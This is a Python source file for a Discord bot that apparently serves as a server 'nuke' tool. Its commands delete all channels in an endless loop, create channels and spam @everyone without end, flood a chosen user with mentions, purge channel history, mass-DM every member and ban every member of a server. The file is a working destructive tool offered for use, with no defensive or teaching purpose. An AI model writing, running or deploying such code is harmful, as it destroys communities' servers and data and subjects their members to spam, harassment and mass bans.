import time
import discord
from discord.ext import commands, tasks
from config import TOKEN
import asyncio



intents = discord.Intents.all()
bot = commands.Bot(command_prefix='!', intents=intents)



@bot.event
async def on_ready():
    print("Bot is ready")
    status.start()



@tasks.loop(seconds=5)
async def status():
    game = discord.Game("!helps")
    await bot.change_presence(status=discord.Status.dnd, activity=game)


@bot.event
async def on_command_error(ctx, error):
    if isinstance(error, commands.CommandNotFound):
        embed = discord.Embed(
            title="Error",
            description="This command doesn't exits.\n Do ***!helps*** for see all commands !",
            color=discord.Color.red()
        )
        await ctx.send(embed=embed)



@bot.command()
async def stop(ctx):
    await bot.close()
    print("process kill")


@bot.command(aliases=['ncr', 'remove_all'])
async def nuke_channel_remove(ctx):
    while True:
        channels = ctx.guild.channels
        for c in channels:
            try:
                await c.delete()
            except Exception as e:
                print(f"Error deleting channel: {e}")
        new_channel = await ctx.guild.create_text_channel(f"by {bot.user.name}")
        await new_channel.send(f"@everyone you got nuked by {bot.user.name}")

@bot.command(aliases=['ncs','spam_channel'])
async def nuke_channel_spam(ctx):

    while True:
        channel = await ctx.guild.create_text_channel(f"by {bot.user.name}")
        while True :
            await channel.send(f"@everyone you get spamed by {bot.user.name}")

@bot.command()
async def spam(ctx, user:discord.User, nb:int):
    tic = time.time()
    for i in range(0,nb):
        await ctx.send(f"{user.mention}")
    tac = time.time()

    print(f"finished {tac-tic}ms")

@spam.error
async def spam_error(ctx: commands.Context, error: commands.CommandError):
    if isinstance(error, commands.MissingRequiredArgument):
        await ctx.send('Arguments need')
    else:
        await ctx.send('Something wrong retry')



@bot.command()
async def purge(ctx: commands.Context, channel: discord.TextChannel = None):
    if channel is None:
        channel = ctx.channel
    async for message in channel.history(limit=None):
        await message.delete()
        await asyncio.sleep(0.5)



@bot.command()
async def massdm(ctx):
    await ctx.message.delete()
    for user in ctx.guild.members:
        try:
            await user.send("hello")
            print(f"Dm'd {user.name}")
        except:
            print(f"Couldn't dm {user.name}")


@bot.command(aliases=['ba', 'b_a'])
async def ban_all(ctx):
    members = ctx.guild.members
    for member in members:
        if member != bot.user:
            await ctx.guild.ban(member, reason="Ur mad")


@bot.command(aliases=['uba_a', 'uba'])
async def unban_all(ctx):
    banned_users = await ctx.guild.bans()
    for ban_entry in banned_users:
        await ctx.guild.unban(ban_entry.user, reason="Unbanned all users.")
    invite = await ctx.channel.create_invite(max_age=0, max_uses=0, unique=True)
    await ctx.send(f"All users have been unbanned. Here is a new invite link: {invite}")

@bot.command()
async def helps(ctx):
    embed = discord.Embed(
        title="Helps",
        description="All commands",
        color=discord.Color.blue(),
    )
    embed.set_thumbnail(url=bot.user.avatar)
    commands = bot.commands
    embed.set_footer(text=ctx.guild.name)
    for command in commands:
        command_bot = command.name
        embed.add_field(name="Commands", value=f"!{command_bot}",inline=False)

    await ctx.send(embed=embed)



bot.run(TOKEN)
